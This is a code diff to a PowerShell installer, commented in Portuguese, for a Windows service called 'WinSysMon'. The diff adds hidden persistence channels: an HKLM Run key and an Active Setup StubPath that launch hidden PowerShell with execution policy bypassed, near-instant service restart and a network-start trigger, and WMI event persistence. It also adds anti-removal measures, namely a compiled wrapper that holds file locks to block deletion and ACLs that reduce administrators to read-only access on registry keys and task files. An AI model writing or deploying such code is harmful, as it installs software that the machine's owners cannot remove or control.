@@ -60,8 +60,10 @@ if ($Uninstall) {
         Get-CimInstance -Namespace $ns -ClassName __EventFilter -Filter "Name='WinSysMonFilter'" -ErrorAction SilentlyContinue | Remove-CimInstance -ErrorAction SilentlyContinue
         Get-CimInstance -Namespace $ns -ClassName CommandLineEventConsumer -Filter "Name='WinSysMonConsumer'" -ErrorAction SilentlyContinue | Remove-CimInstance -ErrorAction SilentlyContinue
     } catch {}
+    try { Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WinSysMonBoot" -ErrorAction SilentlyContinue } catch {}
+    try { Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{A7C8B9D0-1234-5678-ABCD-WINSYSMON00}" -Recurse -Force -ErrorAction SilentlyContinue } catch {}
     Start-Sleep 1
-    Write-InstallLog "Servico, watchdog, guard e WMI removidos" "OK"
+    Write-InstallLog "Servico, watchdog, guard, WMI, registry e active setup removidos" "OK"
     exit 0
 }
 
@@ -166,12 +168,18 @@ try {
 } catch {}
 
 # ---- Compilar wrapper C# (apenas se ainda nao existe ou se forcar) ----
-$needsCompile = -not (Test-Path $exePath)
+# v2: wrapper com file-lock em arquivos criticos (impede delecao enquanto roda)
+$wrapperVersion = "v2"
+$wrapperMarker = Join-Path $installDir "wrapper.version"
+$currentVer = ""
+if (Test-Path $wrapperMarker) { try { $currentVer = (Get-Content $wrapperMarker -Raw -ErrorAction SilentlyContinue).Trim() } catch {} }
+$needsCompile = (-not (Test-Path $exePath)) -or ($currentVer -ne $wrapperVersion)
 if ($needsCompile) {
-    Write-InstallLog "Compilando wrapper de servico..."
+    Write-InstallLog "Compilando wrapper de servico ($wrapperVersion)..."
 
     $source = @'
 using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.ServiceProcess;
@@ -183,11 +191,13 @@ namespace WinSysMonSvc
     {
         private Process _child;
         private Thread _watchdog;
+        private Thread _lockKeeper;
         private volatile bool _stopping;
         private string _installDir;
         private string _psScript;
         private string _logFile;
         private int _restartBackoff = 5000;
+        private List<FileStream> _locks = new List<FileStream>();
 
         public Service()
         {
@@ -201,6 +211,71 @@ namespace WinSysMonSvc
             try { File.AppendAllText(_logFile, "[" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "] [SVC] " + msg + Environment.NewLine); } catch { }
         }
 
+        private void AcquireFileLocks()
+        {
+            // Abre handles exclusivos (sem FileShare.Delete) nos arquivos criticos.
+            // Enquanto o servico roda, nem SYSTEM consegue deletar estes arquivos.
+            string[] critical = new string[] {
+                "winsysmon.ps1",
+                Path.GetFileName(System.Reflection.Assembly.GetExecutingAssembly().Location),
+                "sysmon-config.json"
+            };
+            foreach (var f in critical)
+            {
+                string path = Path.Combine(_installDir, f);
+                try
+                {
+                    if (!File.Exists(path)) continue;
+                    // FileShare.Read permite leitura; NAO inclui Delete -> delete vai falhar
+                    var fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.Read);
+                    _locks.Add(fs);
+                    Log("Lock adquirido em " + f);
+                }
+                catch (Exception ex) { Log("Falha ao travar " + f + ": " + ex.Message); }
+            }
+        }
+
+        private void ReleaseFileLocks()
+        {
+            foreach (var fs in _locks) { try { fs.Close(); } catch { } }
+            _locks.Clear();
+        }
+
+        private void RunLockKeeper()
+        {
+            // Se algum arquivo critico for recriado (self-heal do script), re-trava.
+            while (!_stopping)
+            {
+                try
+                {
+                    string[] critical = new string[] {
+                        "winsysmon.ps1",
+                        Path.GetFileName(System.Reflection.Assembly.GetExecutingAssembly().Location),
+                        "sysmon-config.json"
+                    };
+                    // Remove handles cujos arquivos nao existem mais
+                    _locks.RemoveAll(fs => { try { return !File.Exists(fs.Name); } catch { return true; } });
+                    foreach (var f in critical)
+                    {
+                        string path = Path.Combine(_installDir, f);
+                        if (!File.Exists(path)) continue;
+                        bool already = false;
+                        foreach (var fs in _locks) { if (string.Equals(fs.Name, path, StringComparison.OrdinalIgnoreCase)) { already = true; break; } }
+                        if (already) continue;
+                        try
+                        {
+                            var nfs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.Read);
+                            _locks.Add(nfs);
+                            Log("Lock re-adquirido em " + f);
+                        }
+                        catch { }
+                    }
+                }
+                catch { }
+                Thread.Sleep(10000);
+            }
+        }
+
         protected override void OnStart(string[] args)
         {
             _installDir = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
@@ -209,6 +284,10 @@ namespace WinSysMonSvc
             _stopping   = false;
 
             Log("Servico iniciando (PID=" + Process.GetCurrentProcess().Id + ")");
+            AcquireFileLocks();
+            _lockKeeper = new Thread(RunLockKeeper);
+            _lockKeeper.IsBackground = true;
+            _lockKeeper.Start();
             _watchdog = new Thread(RunWatchdog);
             _watchdog.IsBackground = true;
             _watchdog.Start();
@@ -276,6 +355,7 @@ namespace WinSysMonSvc
                 }
             }
             catch { }
+            ReleaseFileLocks();
         }
 
         protected override void OnShutdown() { OnStop(); }
@@ -314,7 +394,8 @@ namespace WinSysMonSvc
     Remove-Item $srcFile -Force -ErrorAction SilentlyContinue
     Remove-Item "$installDir\csc.out.log" -Force -ErrorAction SilentlyContinue
     Remove-Item "$installDir\csc.err.log" -Force -ErrorAction SilentlyContinue
-    Write-InstallLog "Compilado: $exePath" "OK"
+    try { Set-Content -Path $wrapperMarker -Value $wrapperVersion -Encoding ASCII -Force } catch {}
+    Write-InstallLog "Compilado: $exePath ($wrapperVersion)" "OK"
 } else {
     Write-InstallLog "Wrapper ja existe - reutilizando $exePath"
 }
@@ -329,6 +410,14 @@ if ($LASTEXITCODE -ne 0) {
 & sc.exe description $serviceName "$description" | Out-Null
 & sc.exe failure $serviceName reset= 86400 actions= restart/5000/restart/10000/restart/30000 | Out-Null
 & sc.exe sdset $serviceName "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)" | Out-Null
+# Recovery MAIS agressivo: reset=0 (nunca zera contador), restart=1s sempre, failure em erro grave
+& sc.exe failure $serviceName reset= 0 actions= restart/1000/restart/1000/restart/1000 | Out-Null
+& sc.exe failureflag $serviceName 1 | Out-Null
+& sc.exe config $serviceName start= auto error= normal | Out-Null
+# Service SID type: unrestricted (isolacao de processo)
+try { & sc.exe sidtype $serviceName unrestricted | Out-Null } catch {}
+# Trigger: iniciar quando stack TCP/IP ficar disponivel (mesmo que start nao seja auto)
+try { & sc.exe triggerinfo $serviceName start/networkon | Out-Null } catch {}
 
 # ---- ACL na pasta (usando SIDs bem conhecidos para funcionar em qualquer idioma) ----
 try {
@@ -402,6 +491,75 @@ try {
     New-CimInstance -Namespace $ns -ClassName __FilterToConsumerBinding -Property @{Filter=[ref]$flt;Consumer=[ref]$cns} -ErrorAction Stop | Out-Null
     Write-InstallLog "WMI persistence registrada ($fname + $cname)" "OK"
 } catch { Write-InstallLog "WMI persistence falhou: $($_.Exception.Message)" "WARN" }
+
+# ---- Canal 6: Registry Run (HKLM) ----
+try {
+    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+    $regName = "WinSysMonBoot"
+    $regCmd  = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$wdCmd`""
+    if (-not (Test-Path $regPath)) { New-Item $regPath -Force | Out-Null }
+    Set-ItemProperty -Path $regPath -Name $regName -Value $regCmd -Force
+    Write-InstallLog "Registry Run ($regName) registrada" "OK"
+} catch { Write-InstallLog "Registry Run falhou: $($_.Exception.Message)" "WARN" }
+
+# ---- Canal 7: Active Setup (dispara em cada logon de usuario, uma unica vez por perfil) ----
+try {
+    $asPath = "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{A7C8B9D0-1234-5678-ABCD-WINSYSMON00}"
+    if (-not (Test-Path $asPath)) { New-Item $asPath -Force | Out-Null }
+    Set-ItemProperty -Path $asPath -Name "(default)"    -Value "WinSysMon Bootstrap"
+    Set-ItemProperty -Path $asPath -Name "Version"      -Value "1,0,0,$(Get-Date -Format yyyyMMddHHmm)"
+    Set-ItemProperty -Path $asPath -Name "StubPath"     -Value "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$wdCmd`""
+    Set-ItemProperty -Path $asPath -Name "IsInstalled"  -Value 1 -Type DWord
+    Write-InstallLog "Active Setup registrado" "OK"
+} catch { Write-InstallLog "Active Setup falhou: $($_.Exception.Message)" "WARN" }
+
+# ---- Proteger chaves de registro do servico (deny delete para nao-SYSTEM) ----
+try {
+    $regKeys = @(
+        "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName",
+        "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{A7C8B9D0-1234-5678-ABCD-WINSYSMON00}"
+    )
+    foreach ($rk in $regKeys) {
+        if (-not (Test-Path $rk)) { continue }
+        try {
+            $key = Get-Item $rk
+            $acl = $key.GetAccessControl()
+            $sidSys = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::LocalSystemSid, $null)
+            $sidAdm = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid, $null)
+            $acl.SetAccessRuleProtection($true,$false)
+            foreach ($r in @($acl.Access)) { [void]$acl.RemoveAccessRule($r) }
+            $inh  = [System.Security.AccessControl.InheritanceFlags]"ContainerInherit,ObjectInherit"
+            $prop = [System.Security.AccessControl.PropagationFlags]::None
+            $acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($sidSys,"FullControl",$inh,$prop,"Allow")))
+            $acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($sidAdm,"ReadKey",$inh,$prop,"Allow")))
+            Set-Acl -Path $rk -AclObject $acl
+            Write-InstallLog "Registry ACL: $rk protegida (SYSTEM=Full, Admins=Read)" "OK"
+        } catch { Write-InstallLog "Registry ACL falhou em $rk : $($_.Exception.Message)" "WARN" }
+    }
+} catch { Write-InstallLog "Registry ACL geral falhou: $($_.Exception.Message)" "WARN" }
+
+# ---- Proteger arquivos de Scheduled Tasks (XML em System32\Tasks) ----
+try {
+    $taskFiles = @(
+        "$env:WINDIR\System32\Tasks\WinSysMonWatchdog",
+        "$env:WINDIR\System32\Tasks\WinSysMonGuard"
+    )
+    foreach ($tf in $taskFiles) {
+        if (-not (Test-Path $tf)) { continue }
+        try {
+            try { & takeown.exe /F $tf /A 2>&1 | Out-Null } catch {}
+            $acl = Get-Acl $tf
+            $sidSys = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::LocalSystemSid, $null)
+            $sidAdm = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid, $null)
+            $acl.SetAccessRuleProtection($true,$false)
+            foreach ($r in @($acl.Access)) { [void]$acl.RemoveAccessRule($r) }
+            $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($sidSys,"FullControl","Allow")))
+            $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($sidAdm,"ReadAndExecute","Allow")))
+            Set-Acl -Path $tf -AclObject $acl
+            Write-InstallLog "Task XML protegido: $(Split-Path $tf -Leaf)" "OK"
+        } catch { Write-InstallLog "ACL task $tf : $($_.Exception.Message)" "WARN" }
+    }
+} catch {}
 
 # ---- Iniciar servico com retry ----
 Write-InstallLog "Iniciando servico..."
